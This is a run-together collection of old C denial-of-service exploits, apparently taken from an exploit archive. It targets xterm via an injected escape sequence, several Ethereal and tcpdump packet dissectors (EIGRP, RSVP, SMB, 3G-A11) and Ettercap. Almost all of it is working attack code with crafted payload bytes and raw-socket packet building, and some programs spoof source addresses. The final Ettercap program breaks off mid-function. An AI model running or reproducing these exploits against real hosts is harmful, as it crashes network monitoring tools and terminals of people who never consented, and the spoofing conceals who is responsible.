This vulnerability also affects applications (such as other terminal emulators) derived from xterm code.

/*
 *
 * xterm Denial of Service Attack
 * (C) 2000 Kit Knox <kit@rootshell.com> - 5/31/2000
 *
 * Tested against: xterm (XFree86 3.3.3.1b(88b)  -- crashes
 *                 rxvt v2.6.1 -- consumes all available memory and then
 *                                crashes.
 *
 * Not vulnerable: KDE konsole 0.9.11
 *                 Secure CRT 3.0.x
 *
 *
 * By sending the VT control characters to resize a window it is possible
 * to cause an xterm to crash and in some cases consume all available
 * memory.
 *
 * This itself isn't much of a problem, except that remote users can inject
 * these control characters into your xterm numerous ways including :
 *
 * o Directories and filenames on a rogue FTP servers.
 * o Rogue banner messages on ftp, telnet, mud daemons.
 * o Log files (spoofed syslog messages, web server logs, ftp server logs)
 *
 * This sample exploit injects these control characters into a web get
 * request.  If an admin were to cat this log file, or happened to be doing
 * a "tail -f access_log" at the time of attack they would find their
 * xterm crash.
 *
 * Embedding "ESCAPE[4;65535;65535t" (where escape is the escape character)
 * inside files, directories, etc will have the same effect as this code.
 *
 */

#include <stdio.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

int sock;

int
main (int argc, char *argv[])
{
  struct hostent *he;
  struct sockaddr_in sa;
  char buf[1024];
  char packet[1024];
  int i;

  fprintf(stderr, "[ http://www.rootshell.com/ ] - xterm DoS attack - 05/31/2000.\n\n");
  if (argc != 2)
    {
      fprintf (stderr, "usage: %s <host/ip>\n", argv[0]);
      return (-1);
    }

  sock = socket (AF_INET, SOCK_STREAM, 0);
  sa.sin_family = AF_INET;
  sa.sin_port = htons (80);
  he = gethostbyname (argv[1]);
  if (!he)
    {
      if ((sa.sin_addr.s_addr = inet_addr (argv[1])) == INADDR_NONE)
	return (-1);
    }
  else
    {
      bcopy (he->h_addr, (struct in_addr *) &sa.sin_addr, he->h_length);
    }
  if (connect (sock, (struct sockaddr *) &sa, sizeof (sa)) < 0)
    {
      fprintf (stderr,
	       "Fatal Error: Can't connect to web server.\n");
      return (-1);
    }
  sprintf(packet, "GET /\033[4;65535;65535t HTTP/1.0\n\n");
  write (sock, packet, strlen(packet));
  close (sock);
  fprintf(stderr, "Done.\n");
}


/*
 * Ethereal network protocol analyzer
 * EIGRP Dissector TLV_IP_INT Long IP Address Overflow
 * vulnerability
 * proof of concept code
 * version 1.0 (Mar 26 2004)
 *
 * by R&#65533;mi Denis-Courmont < ethereal at simphalampin dot com >
 *   www simphalempin com dev 
 *
 * This vulnerability was found by:
 *   Stefan Esser s.esser e-matters de
 * whose original advisory may be fetched from:
 *   security e-matters de advisories 032004.html
 *
 * Vulnerable:
 *  - Ethereal v0.10.2
 *
 * Not vulnerable:
 *  - Ethreal v0.10.3
 *
 * Note: this code will simply trigger a denial of service on Ethereal.
 * It should really be possible to exploit the buffer overflow
 * (apparently up to 29 bytes overflow), but I haven't tried.
 */


#include <string.h>
#include <stdio.h>

#include <sys/types.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netdb.h>

static const char packet[] =
        "\x01" /* Version */
        "\x04" /* Opcode: Reply */
        "\x00\x00" /* Checksum (invalid) */
        "\x00\x00\x00\x00" /* Flags */
        "\x00\x00\x00\x00" /* Sequence number */
        "\x00\x00\x00\x00" /* ACK */
        "\x00\x00\x00\x00" /* AS number */

        /* IP internal routes TLV */
        "\x01\x02" /* Type */
        "\x00\x39" /* Length (should be 0x1C) */
        "\x00\x00\x00\x00" /* Next hop */
        "\x00\x00\x00\x00" /* Delay */
        "\x00\x00\x00\x00" /* Bandwitdh */
        "\x00\x00\x00" /* MTU */
        "\x00" /* Hop count: directly connected */
        "\xff" /* Reliability: maximum */
        "\x01" /* Load: minimum */
        "\x00\x00" /* Reserved */
        "\xff" /* Prefix length: should be > 0 and <= 32 */
        "\x00\x00\x00" /* Destination network */
        "\xff\xff\xff\xff" "\xff\xff\xff\xff"
        "\xff\xff\xff\xff" "\xff\xff\xff\xff"
        "\xff\xff\xff\xff" "\xff\xff\xff\xff"
        "\xff\xff\xff\xff" "\xff" /* buffer overflow */
;


static int
proof (const struct sockaddr_in *dest)
{
        int fd;
        size_t len;

        fd = socket (PF_INET, SOCK_RAW, 88);
        if (fd == -1)
        {
                perror ("Raw socket error");
                return 1;
        }

        len = sizeof (packet) - 1;
        if (sendto (fd, packet, len, 0, (const struct sockaddr *)dest,
                        sizeof (struct sockaddr_in)) != len)
        {
                perror ("Packet sending error");
                close (fd);
                return 1;
        }

        puts ("Packet sent!");
        close (fd);
        return 0;
}


static int
usage (const char *path)
{
        fprintf (stderr, "Usage: %s <hostname/IP>\n", path);
        return 2;
}


int
main (int argc, char *argv[])
{
        struct sockaddr *dest;

        puts ("Ethereal EIGRP Dissector TLV_IP_INT Long IP Address Overflow\n"
                "proof of concept code\n"
                "Copyright (C) 2004 R<E9>mi Denis-Courmont "
                "<\x65\x74\x68\x65\x72\x65\x61\x6c\x40\x73\x69\x6d\x70"
                "\x68\x61\x6c\x65\x6d\x70\x69\x6e\x2e\x63\x6f\x6d>\n");


        if (argc != 2)
                return usage (argv[0]);
        else
        {
                struct addrinfo help, *res;
                int check;

                memset (&help, 0, sizeof (help));
                help.ai_family = PF_INET;

                check = getaddrinfo (argv[1], NULL, &help, &res);
                if (check)
                {
                        fprintf (stderr, "%s: %s\n", argv[1],
                                        gai_strerror (check));
                        return 1;
                }

                dest = res->ai_addr;
        }

        return proof ((const struct sockaddr_in *)dest);
}/*[ tcpdump(/ethereal)[]: (RSVP) rsvp_print() infinite loop DOS. ]* 
 *                                                                *
 * by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)               *
 *                                                                *
 * compile:                                                       *
 *  gcc xtcpdump+ethr-rsvp-dos.c -o xtcpdump+ethr-rsvp-dos        *
 *                                                                *
 * tcpdump homepage/URL:                                          *
 *  http://www.tcpdump.org                                        *
 *                                                                *
 * ethereal homepage/URL:                                         *
 *  http://www.ethereal.com                                       *
 *                                                                *
 * effected versions:                                             *
 *  tcpdump: v3.8.x/v3.9.1/CVS (didn't check below 3.8.x)         *
 *  ethereal: v0.10.10 (appears to be fixed in 0.10.10 SVN>14167) *
 *                                                                *
 * tcpdump(v3.9.1 and earlier versions) contains a remote denial  *
 * of service vulnerability in the form of a single (RSVP) packet *
 * causing an infinite loop.                                      *
 *                                                                *
 * this bug also effects ethereal[v0.10.10] in a similar way, i   *
 * did not check ethereals source code to find out why, tcpdump   *
 * was the focus. (the packet usually must be clicked on, the     *
 * ICMP replies given back will cause it too)                     *
 *                                                                *
 * as this bug doesn't appear to be fixed in the new(3.9.x/CVS)   *
 * versions i'll elaborate on the problem.  the bug lies in       *
 * rsvp_print() in the RSVP_OBJ_ERO(and RSVP_OBJ_RRO) class,      *
 * allowing a zero length(+4 length really) situation, causing an *
 * infinite loop.                                                 *
 *                                                                *
 * some versions of tcpdump(depending on the platform/OS) need no *
 * special command-line arguments to allow this to happen,        *
 * however most need the "-v" argument.                           *
 ******************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#ifdef _USE_ARPA
#include <arpa/inet.h>
#endif

/* doesn't seem to be standardized, so... */
#if defined(__BYTE_ORDER) && !defined(BYTE_ORDER)
#define BYTE_ORDER __BYTE_ORDER
#endif
#if defined(__BIG_ENDIAN) && !defined(BIG_ENDIAN)
#define BIG_ENDIAN __BIG_ENDIAN
#endif
#if defined(BYTE_ORDER) && defined(BIG_ENDIAN)
#if BYTE_ORDER == BIG_ENDIAN
#define _USE_BIG_ENDIAN
#endif
#endif

#define DFL_AMOUNT 5

/* avoid platform-specific header madness. */
/* (just plucked out of header files) */
struct iph{
#ifdef _USE_BIG_ENDIAN
 unsigned char version:4,ihl:4;
#else
 unsigned char ihl:4,version:4;
#endif
 unsigned char tos;
 unsigned short tot_len;
 unsigned short id;
 unsigned short frag_off;
 unsigned char ttl;
 unsigned char protocol;
 unsigned short check;
 unsigned int saddr;
 unsigned int daddr;
};
struct rsvph{
 unsigned char ver_flags;
 unsigned char type;
 unsigned short check;
 unsigned char ttl;
 unsigned char reserved;
 unsigned short len;
};
struct sumh{
  unsigned int saddr;
  unsigned int daddr;
  unsigned char fill;
  unsigned char protocol;
  unsigned short len;
};

/* malformed RSVP data. (the bug) */
static char payload[]=
 "\x00\x08\x14\x01\x03\x00\x00\x00"
 /* not needed for tcpdump, but this breaks ethereal. */
 "\x00\x00\x00\x00";

/* prototypes. (and sig_alarm) */
void rsvp_spoof(unsigned int,unsigned int);
unsigned short in_cksum(unsigned short *,signed int);
unsigned int getip(char *);
void printe(char *,signed char);
void sig_alarm(){printe("alarm/timeout hit.",1);}

/* begin. */
int main(int argc,char **argv) {
 unsigned char nospoof=0;
 unsigned int amt=DFL_AMOUNT;
 unsigned int daddr=0,saddr=0;
 printf("[*] tcpdump(/ethereal)[]: (RSVP) rsvp_print() infinite loop "
 "DOS.\n[*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)\n\n");
 if(argc<2){
  printf("[*] syntax: %s <dst host> [src host(0=random)] [amount]\n",
  argv[0]);
  exit(1);
 }
 if(!(daddr=getip(argv[1])))
  printe("invalid destination host/ip.",1);
 if(argc>2)saddr=getip(argv[2]);
 if(argc>3)amt=atoi(argv[3]);
 if(!amt)printe("no packets?",1);
 printf("[*] destination\t: %s\n",argv[1]);
 if(!nospoof)
  printf("[*] source\t: %s\n",(saddr?argv[2]:"<random>"));
 printf("[*] amount\t: %u\n\n",amt);
 printf("[+] sending(packet = .): ");
 fflush(stdout);
 while(amt--){
  /* spice things up. */
  srandom(time(0)+amt);
  rsvp_spoof(daddr,saddr);
  printf(".");
  fflush(stdout);
  usleep(50000);
 }
 printf("\n\n[*] done.\n");
 fflush(stdout);
 exit(0);
}
/* (spoofed) generates and sends a (RSVP) ip packet. */
void rsvp_spoof(unsigned int daddr,unsigned int saddr){
 signed int sock=0,on=1;
 unsigned int psize=0;
 char *p,*s;
 struct sockaddr_in sa;
 struct iph ip;
 struct rsvph rsvp;
 struct sumh sum;
 /* create raw (rsvp) socket. */
 if((sock=socket(AF_INET,SOCK_RAW,IPPROTO_RSVP))<0)
  printe("could not allocate raw socket.",1);
 /* allow (on some systems) for the user-supplied ip header. */
#ifdef IP_HDRINCL
 if(setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&on,sizeof(on)))
  printe("could not set IP_HDRINCL socket option.",1);
#endif
 sa.sin_family=AF_INET;
 sa.sin_addr.s_addr=daddr;
 psize=(sizeof(struct iph)+sizeof(struct rsvph)+sizeof(payload)-1);
 memset(&ip,0,sizeof(struct iph));
 memset(&rsvp,0,sizeof(struct rsvph));
 /* values not filled = 0, from the memset() above. */
 ip.ihl=5;
 ip.version=4;
 ip.tot_len=htons(psize);
 ip.saddr=(saddr?saddr:random()%0xffffffff);
 ip.daddr=daddr;
 ip.ttl=(64*(random()%2+1));
 ip.protocol=IPPROTO_RSVP;
 ip.frag_off=64;
 rsvp.ver_flags=16; /* v1/noflags. */
 rsvp.type=20; /* HELLO. */
 rsvp.ttl=(64*(random()%2+1));
 rsvp.len=htons(sizeof(struct rsvph)+sizeof(payload)-1);
 /* needed for the ip checksum. */
 sum.saddr=ip.saddr;
 sum.daddr=ip.daddr;
 sum.fill=0;
 sum.protocol=ip.protocol;
 sum.len=htons(sizeof(struct rsvph)+sizeof(payload)-1);
 /* make sum/calc buffer for the rsvp checksum. (correct) */
 if(!(s=(char *)malloc(sizeof(struct rsvph)+sizeof(payload)+1)))
  printe("malloc() failed.",1);
 memset(s,0,(sizeof(struct rsvph)+sizeof(payload)+1));
 memcpy(s,&rsvp,sizeof(struct rsvph));
 memcpy(s+sizeof(struct rsvph),payload,sizeof(payload)-1);
 rsvp.check=in_cksum((unsigned short *)s,sizeof(struct rsvph)
 +sizeof(payload)-1);
 free(s);
 /* make sum/calc buffer for the ip checksum. (correct) */
 if(!(s=(char *)malloc(sizeof(struct iph)+1)))
  printe("malloc() failed.",1);
 memset(s,0,(sizeof(struct iph)+1));
 memcpy(s,&ip,sizeof(struct iph));
 ip.check=in_cksum((unsigned short *)s,sizeof(struct iph));
 free(s);
 /* put the packet together. */
 if(!(p=(char *)malloc(psize+1)))
  printe("malloc() failed.",1);
 memset(p,0,psize);
 memcpy(p,&ip,sizeof(struct iph));
 memcpy(p+sizeof(struct iph),&rsvp,sizeof(struct rsvph));
 memcpy(p+(sizeof(struct iph)+sizeof(struct rsvph)),
 payload,sizeof(payload));
 /* send the malformed (RSVP) packet. */
 if(sendto(sock,p,psize,0,(struct sockaddr *)&sa,
 sizeof(struct sockaddr))<psize)
  printe("failed to send forged RSVP packet.",1);
 free(p);
 return;
}
/* standard method for creating TCP/IP checksums. */
unsigned short in_cksum(unsigned short *addr,signed int len){
 unsigned short answer=0;
 register unsigned short *w=addr;
 register int nleft=len,sum=0;
 while(nleft>1){
  sum+=*w++;
  nleft-=2;
 }
 if(nleft==1){
  *(unsigned char *)(&answer)=*(unsigned char *)w;
  sum+=answer;
 }
 sum=(sum>>16)+(sum&0xffff);
 sum+=(sum>>16);
 answer=~sum;
 return(answer);
}
/* gets the ip from a host/ip/numeric. */
unsigned int getip(char *host){
 struct hostent *t;
 unsigned int s=0;
 if((s=inet_addr(host))){
  if((t=gethostbyname(host)))
   memcpy((char *)&s,(char *)t->h_addr,sizeof(s));
 }
 if(s==-1)s=0;
 return(s);
}
/* all-purpose error/exit function. */
void printe(char *err,signed char e){
 printf("[!] %s\n",err);
 if(e)exit(e);
 return;
}

// milw0rm.com [2005-04-26]
/*****************************************************************/
/*                                                               */
/* Ethereal <= 0.10.10 dissect_ipc_state() DoS                   */
/* Tested on 0.9.4 and 0.10.10                                   */
/*                                                               */
/* Bug found by the Ethereal BuildBot                            */
/* Code ripped from vade79                                       */
/* Exploit by Nicob <nicob@nicob.net>                            */
/*                                                               */
/* From the Ethereal Security Advisory #19 :                     */
/* http://www.ethereal.com/appnotes/enpa-sa-00019.html           */
/*                                                               */
/* "The SMB dissector could cause a segmentation fault and throw */
/* assertions. Versions affected: 0.9.0 to 0.10.10"              */
/*                                                               */
/*****************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#ifdef _USE_ARPA
#include <arpa/inet.h>
#endif

/* doesn't seem to be standardized, so... */
#if defined(__BYTE_ORDER) && !defined(BYTE_ORDER)
#define BYTE_ORDER __BYTE_ORDER
#endif
#if defined(__BIG_ENDIAN) && !defined(BIG_ENDIAN)
#define BIG_ENDIAN __BIG_ENDIAN
#endif
#if defined(BYTE_ORDER) && defined(BIG_ENDIAN)
#if BYTE_ORDER == BIG_ENDIAN
#define _USE_BIG_ENDIAN
#endif
#endif

/* will never need to be changed. */
#define SMB_PORT 138

/* avoid platform-specific header madness. */
/* (just plucked out of header files) */
struct iph{
#ifdef _USE_BIG_ENDIAN
unsigned char version:4,ihl:4;
#else
unsigned char ihl:4,version:4;
#endif
unsigned char tos;
unsigned short tot_len;
unsigned short id;
unsigned short frag_off;
unsigned char ttl;
unsigned char protocol;
unsigned short check;
unsigned int saddr;
unsigned int daddr;
};
struct udph{
unsigned short source;
unsigned short dest;
unsigned short len;
unsigned short check;
};
struct sumh{
unsigned int saddr;
unsigned int daddr;
unsigned char fill;
unsigned char protocol;
unsigned short len;
};

/* malformed SMB data. (the bug) */
static char payload[]=
"\x11\x1a\x69\xb8\x0a\x02\x0f\x3d\x00\x8a\x00"
"\xbb\x00\x00\x20\x46\x45\x45\x4a\x45\x43\x46\x46\x46\x43\x45\x50\x45\x4b\x43"
"\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x00\x20"
"\x45\x44\x45\x43\x46\x45\x46\x46\x46\x44\x45\x42\x43\x41\x43\x41\x43\x41\x43"
"\x41\x43\x41\x43\x41\x43\x49\x43\x41\x43\x41\x42\x4e\x00\xff\x53\x4d\x42\x25"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x38\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x21\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\xe8\x03\x00\x00\x36\x00\x00\x00\x00\x00\x21\x00\x56\x00\x03\x00\x01"
"\x00\x00\x00\x02\x00\x32\x00\x5c\x4d\x41\x49\x4c\x53\x4c\x4f\x54\xb3\x42\x52"
"\x4f\x57\x4e\x45\x00\x01\x00\x80\xfc\x0a\x00\x5f\x4e\x49\x43\x4f\x42\x5f\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x07\x90\x01\x00\x0f\x01\x55";

/* prototypes. (and sig_alarm) */
void nbt_nospoof(unsigned int);
void nbt_spoof(unsigned int,unsigned int);
unsigned short in_cksum(unsigned short *,signed int);
unsigned int getip(char *);
void printe(char *,signed char);
void sig_alarm(){printe("alarm/timeout hit.",1);}

/* begin. */
int main(int argc,char **argv) {
unsigned char nospoof=0;
unsigned int daddr=0,saddr=0;
printf("\n[*] Ethereal <= 0.10.10 SMB DoS.\n[*] by Nicob (code ripped from vade79)\n\n");
if(argc<2){
printf("[*] syntax: %s <dst host> [src host(0=random)]\n",
argv[0]);
printf("[*] syntax: %s <dst host> nospoof\n",argv[0]);
exit(1);
}
if(!(daddr=getip(argv[1])))
printe("invalid destination host/ip.",1);
if(argc>2){
if(strstr(argv[2],"nospoof"))nospoof=1;
else saddr=getip(argv[2]);
}
printf("[*] destination\t: %s\n",argv[1]);
if(!nospoof)
printf("[*] source\t: %s (spoofed)\n",(saddr?argv[2]:"<random>"));
else
printf("[*] source\t: real IP\n");
printf("[+] sending packet ...");
fflush(stdout);
srandom(time(0));
if(nospoof)nbt_nospoof(daddr);
else nbt_spoof(daddr,saddr);
printf(".");
fflush(stdout);
printf("\n[*] done.\n\n");
fflush(stdout);
exit(0);
}
/* (non-spoofed) sends a (SMB) udp packet. */
void nbt_nospoof(unsigned int daddr){
signed int sock;
struct sockaddr_in sa;
sock=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
sa.sin_family=AF_INET;
sa.sin_port=htons(SMB_PORT);
sa.sin_addr.s_addr=daddr;
if(sendto(sock,payload,sizeof(payload)-1,0,(struct sockaddr *)&sa,
sizeof(struct sockaddr))<sizeof(payload)-1)
printe("failed to send non-spoofed SMB packet.",1);
close(sock);
return;
}
/* (spoofed) generates and sends a (SMB) udp packet. */
void nbt_spoof(unsigned int daddr,unsigned int saddr){
signed int sock=0,on=1;
unsigned int psize=0;
char *p,*s;
struct sockaddr_in sa;
struct iph ip;
struct udph udp;
struct sumh sum;
/* create raw (UDP) socket. */
if((sock=socket(AF_INET,SOCK_RAW,IPPROTO_UDP))<0)
printe("could not allocate raw socket.",1);
/* allow (on some systems) for the user-supplied ip header. */
#ifdef IP_HDRINCL
if(setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&on,sizeof(on)))
printe("could not set IP_HDRINCL socket option.",1);
#endif
sa.sin_family=AF_INET;
sa.sin_port=htons(SMB_PORT);
sa.sin_addr.s_addr=daddr;
psize=(sizeof(struct iph)+sizeof(struct udph)+sizeof(payload)-1);
memset(&ip,0,sizeof(struct iph));
memset(&udp,0,sizeof(struct udph));
/* values not filled = 0, from the memset() above. */
ip.ihl=5;
ip.version=4;
ip.tot_len=htons(psize);
ip.saddr=(saddr?saddr:random()%0xffffffff);
ip.daddr=daddr;
ip.ttl=(64*(random()%2+1));
ip.protocol=IPPROTO_UDP;
ip.frag_off=64;
udp.source=htons(SMB_PORT);
udp.dest=htons(SMB_PORT);
udp.len=htons(sizeof(struct udph)+sizeof(payload)-1);
/* needed for (correct) checksums. */
sum.saddr=ip.saddr;
sum.daddr=ip.daddr;
sum.fill=0;
sum.protocol=ip.protocol;
sum.len=htons(sizeof(struct udph)+sizeof(payload)-1);
/* make sum/calc buffer for the udp checksum. (correct) */
if(!(s=(char *)malloc(sizeof(struct sumh)+sizeof(struct udph)
+sizeof(payload)+1)))
printe("malloc() failed.",1);
memset(s,0,(sizeof(struct sumh)+sizeof(struct udph)
+sizeof(payload)+1));
memcpy(s,&sum,sizeof(struct sumh));
memcpy(s+sizeof(struct sumh),&udp,sizeof(struct udph));
memcpy(s+sizeof(struct sumh)+sizeof(struct udph),
payload,sizeof(payload)-1);
udp.check=in_cksum((unsigned short *)s,
sizeof(struct sumh)+sizeof(struct udph)+sizeof(payload)-1);
free(s);
/* make sum/calc buffer for the ip checksum. (correct) */
if(!(s=(char *)malloc(sizeof(struct iph)+1)))
printe("malloc() failed.",1);
memset(s,0,(sizeof(struct iph)+1));
memcpy(s,&ip,sizeof(struct iph));
ip.check=in_cksum((unsigned short *)s,sizeof(struct iph));
free(s);
/* put the packet together. */
if(!(p=(char *)malloc(psize+1)))
printe("malloc() failed.",1);
memset(p,0,psize);
memcpy(p,&ip,sizeof(struct iph));
memcpy(p+sizeof(struct iph),&udp,sizeof(struct udph));
memcpy(p+(sizeof(struct iph)+sizeof(struct udph)),
payload,sizeof(payload));
/* send the malformed SMB packet. */
if(sendto(sock,p,psize,0,(struct sockaddr *)&sa,
sizeof(struct sockaddr))<psize)
printe("failed to send forged SMB packet.",1);
free(p);
return;
}
/* standard method for creating TCP/IP checksums. */
unsigned short in_cksum(unsigned short *addr,signed int len){
unsigned short answer=0;
register unsigned short *w=addr;
register int nleft=len,sum=0;
while(nleft>1){
sum+=*w++;
nleft-=2;
}
if(nleft==1){
*(unsigned char *)(&answer)=*(unsigned char *)w;
sum+=answer;
}
sum=(sum>>16)+(sum&0xffff);
sum+=(sum>>16);
answer=~sum;
return(answer);
}
/* gets the ip from a host/ip/numeric. */
unsigned int getip(char *host){
struct hostent *t;
unsigned int s=0;
if((s=inet_addr(host))){
if((t=gethostbyname(host)))
memcpy((char *)&s,(char *)t->h_addr,sizeof(s));
}
if(s==-1)s=0;
return(s);
}
/* all-purpose error/exit function. */
void printe(char *err,signed char e){
printf("[!] %s\n",err);
if(e)exit(e);
return;
}

// milw0rm.com [2005-05-07]
                                                                                                                                                                                                                                                               
/*
 * 
 * Ethereal 3G-A11 remote buffer overflow PoC exploit 
 * --------------------------------------------------
 * Coded by Leon Juranic <ljuranic@lss.hr> 
 * LSS Security <http://security.lss.hr/en/>
 * 
 */ 

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>


main (int argc, char **argv)
{
	int sock;
	struct sockaddr_in sin;
	unsigned char buf[1024];
	char bla[200];

	sock=socket(AF_INET,SOCK_DGRAM,0);

	sin.sin_family=AF_INET;
	sin.sin_addr.s_addr = inet_addr(argv[1]);
	sin.sin_port = htons(699);

	buf[0] = 22;
	memset(buf+1,'A',19);
	buf[20] = 38;
	*(unsigned short*)&buf[22] = htons(100); 
	*(unsigned short*)&buf[28] = 0x0101;
	buf[30] = 31;
	buf[31] = 150;   // len for overflow...play with this value if it doesn't work

	memset (bla,'B',200);
	strncpy (buf+32,bla,180);
	
	sendto (sock,buf,200,0,(struct sockaddr*)&sin,sizeof(struct sockaddr));
}

// milw0rm.com [2005-03-08]
/*
     WARNING WARNING WARNING

     THIS PACKAGE CONTAINS AN 0DAY.
     NO ONE CAN BE HELD RESPONSIBLE IF THIS CODE RAPES YOUR SISTER OR MOLESTS YOUR DOG.
    
     WARNING WARNING WARNING


     THE ONE PACKET ETTERCAP KILLER NOW IN A SMALLER PACKAGE!
  
     If you want to know how this works then figure it out yourself.
     Tested with Ettercap-NG v 0.7.3 on FreeBSD 6.1 and Slackware 10.1

     greetz go out to tip, milkmang, chrak, jcb, rest of b4b0, mosthated, xtaylor, and rest of global hell,riot, JxT,
      p00kie_p0x, tadp0le, #oldskewl, #ubergeeks, #wp, le_kickban for fucking french women and anyone else I forgot..

     REMEBER KIDS EVILRABBI LOVES YOU :*.
 
    gcc -Wall -o b4b0-ettercap  b4b0-ettercap.c
    ./b4b0-ettercap <victim_ip>

*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>

#define IP              struct iphdr
#define TCP             struct tcphdr

void usage();
unsigned short ipChecksum(unsigned short *ptr, int nbytes);

void usage()
{
int i;
for (i=0; i < 100; i++) { printf("\n");}

 printf("               VVVVVVVVVVV                    VVVVVVVVVVV\n");
 printf("                VVVVV[ T34M B4B0 PROUDLY PRESENTS: ]VVVV\n");
 printf("                 VVVVVVVVVV                      VVVVVVV\n");
 printf("                  VVVVVVVVV   b4b0-ettercap.c   VVVVVVV\n");
 printf("       .    $&y    VVVVVVVVVV   ,p&   y&$  VVVVVVVVVV,a8888a,\n");
 printf("            $$'     VVVVVVVVVV,d$$$   $$' VVVVV .s$',8P\"'  `\"Y8,     . \n");
 printf("       yxxx.$$.xxxxxxxxxxxx ,d$\"`$$.x.$$.xxxxxxxx.,8P.xxxx.s`$$,.xxxg \n");
 printf("       $ P' $$,d$$Yba,    ,d$\" d $$   $$,d$$Yba,  88      ,$.$$$    $ \n");
 printf("       $ '  $$P'  ,`$$a ,d$\" ``\" $$ , $$$P' ,`Y$a 88     ,s$,$$$  . $ \n");
 printf("       $    $$k   g Y$$ $$$$$$$$$$$$$ $$f   d d$$ `8b   ,$$'d$$' ,d $ \n");
 printf("       bxxx.$$$, '`,d$\".xxxxxxxx.$$.x.$$b, ',a$$\".x`8ba,,aad$$'.xxxxd.  . \n");
 printf("            s$Y\"Y$bd$P',yas.VVVV s$$z  $Y\"Y$$$P\"'     \"Y$$$$(headflux)$ \n");
 printf("                         VVVVVVVV      VVVVVVVV \n");
 printf("                          VVVVVVVV    VVVVVVVV \n");
 printf("  ettercap-ng v0.7.3       VVVVVVVV  VVVVVVVV \n");
 printf("  Denial of Service         VVVVVVVVVVVVVVVV \n");
 printf("    by EvilRabbi             VVVVVVVVVVVVVV \n");
 printf(" <evilrabbi[@]gmail.com       VVVVVVVVVVVV \n");
 printf("                               VVVVVVVVVV \n");
 printf("                                VVVVVVVV \n");
 printf("./b4b0-ettercap  <victim ip>     VVVVVV \n");
 printf("                                  VVVV \n");
 printf("                                   VV \n");
}
unsigned short ipChecksum(unsigned short *ptr, int nbytes)
{
        register long sum;
        register u_short answer;
        u_short oddbyte;

        sum = 0;

        while (nbytes > 1) {
                sum += *ptr++;
                nbytes -= 2;
        }

        if (nbytes == 1) {
                oddbyte = 0;
                *((u_char *) & oddbyte) = *(u_char *) ptr;
                sum += oddbyte;
        }

        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        answer = ~sum;
return (answer);
}

int main(int argc, char **argv)
{
    int sockfd, opt = 1;
    char tcpoptions[4];
    char dest[20];
    unsigned int pLen,sIPLen;
    unsigned char pkt[(pLen = sizeof(IP) + sizeof(TCP) + 4)];
    unsigned char ip[(sIPLen = 12 + sizeof(TCP) + 4)];
    struct hostent *he;
    struct sockaddr_in host;
    struct sockaddr_in s;

    struct in_addr etter;
    IP *iphdr = (IP *)pkt;
    TCP *tcphdr = (TCP *)((unsigned char *)pkt + sizeof(IP));   

    if (getuid() != 0) {
    printf("you need to be r00t =(\n");
    exit(0);
    }

    if (argc != 2) {
    usage();
    exit(0);
    }
    if ((he=gethostbyname(argv[1])) == NULL) {  // get the host info
        herror("gethostbyname");
        exit(1);
    }
    snprintf (dest,sizeof(dest)-1,"%d.%d.%d.%d\n", (unsigned char)he->h_addr_list[0][0],
                             (unsigned char)he->h_addr_list[0][1],
                                                     (unsigned char)he->h_addr_list[0][2],
                                                     (unsigned char)he->h_addr_list[0][3]);

    if ((sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_TCP)) == -1) {
        perror("socket");
        exit(1);
    }
    setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&opt,sizeof(opt));

     etter.s_addr = inet_addr(dest);
    s.sin_addr.s_addr = INADDR_ANY;
    //etter.s_addr = inet_addr("69.46.19.77");
    memset(tcpoptions,0,sizeof(tcpoptions));
    tcpoptions[0]=0x08;
    tcpoptions[1]=0x00;
    tcpoptions[2]=0x00;
    tcpoptions[3]=0x00;
 
    memset(&host, 0, sizeof(host));
    memset(pkt, 0, pLen);
    memcpy(pkt+sizeof(IP)+sizeof(TCP), tcpoptions, sizeof(tcpoptions));
    memset(ip, 0, sIPLen);
    *((unsigned long *)((unsigned char *)ip+0)) = s.sin_addr.s_addr;
    *((unsigned long *)((unsigned char *)ip+4)) = etter.s_addr;
    *((unsigned char *)((unsigned char *)ip+8)) = 0;
    *((unsigned char *)((unsigned char *)ip+9)) = IPPROTO_TCP;
    *((unsigned short *)((unsigned char *)ip+10)) = htons(pLen - sizeof(IP));
    iphdr->version       = 4;
    iphdr->ihl      = 5;
    iphdr->id      = rand() & 0xFFFF;
    iphdr->id = iphdr->id + 1;
    iphdr->saddr = s.sin_addr.s_addr;
    iphdr->daddr = etter.s_addr;
    iphdr->protocol       = IPPROTO_TCP;       
    iphdr->ttl     = 255;
    iphdr->tot_len     = pLen;
    iphdr->check     = ipChecksum((u_short *)iphdr, sizeof(IP));

    host.sin_family       = AF_INET;
    host.sin_addr.s_addr = etter.s_addr;

    tcphdr->source = htons(8);
    tcphdr->dest = htons(1);
    tcphdr->seq   = htonl(rand());
